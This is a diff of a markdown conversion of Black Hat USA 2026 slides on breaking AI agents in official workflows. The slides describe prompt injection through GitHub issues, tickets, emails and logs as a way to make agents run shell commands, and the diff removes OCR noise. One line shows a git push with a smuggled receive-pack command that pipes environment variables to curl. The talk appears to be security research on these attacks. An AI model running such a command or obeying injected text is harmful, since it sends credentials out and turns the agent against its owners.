@@ -22,7 +22,6 @@ converted_at: "2026-08-11T23:09:01Z"
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Elad Meged_Trusted Enough to Run Breaking AI Agents in Official Workflows_Compressed.pdf` (68 pages)
 
-
 ## Slide 1
 
 ### TRUSTED ENOUGH TO RUN
@@ -86,18 +85,13 @@ Prompt injection is not the vulnerability. It's the **delivery mechanism** . And
 
 ```text
 ATTACK SURFACE BY DESIGN
-ff 9 a
 { ) GitHub — > Shell
 Issues & PRs i DOERR | @— | commands
-a Z N 4
-f- = »)
 ol. File reads
 bd bo Teams messages & writes
 & 4
-a 3 >)
 Support API calls &
 tickets & emails webhooks
-& y )
 ( »)
 = Logs, webhooks, CI/CD
 documents pipelines
@@ -425,7 +419,6 @@ git push --receive-pack='sh -c "env | curl ...; exec git-receive-pack \"$@\"" --
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-© © © C Etacrieged-Novecicioude-co x + .
 € > G 5% oithub.com/cladMeged-Novee/claude-code
 BE ©) novee-ojegent-fa... QB Dashboard —Exca_M Novee-Continuou... \x agent-factory-ela.. gf? Pricing! Render CodeQL.zerotohe._ vx agent-actory-ela._) Your Repositories
 Q type (7) to search 68
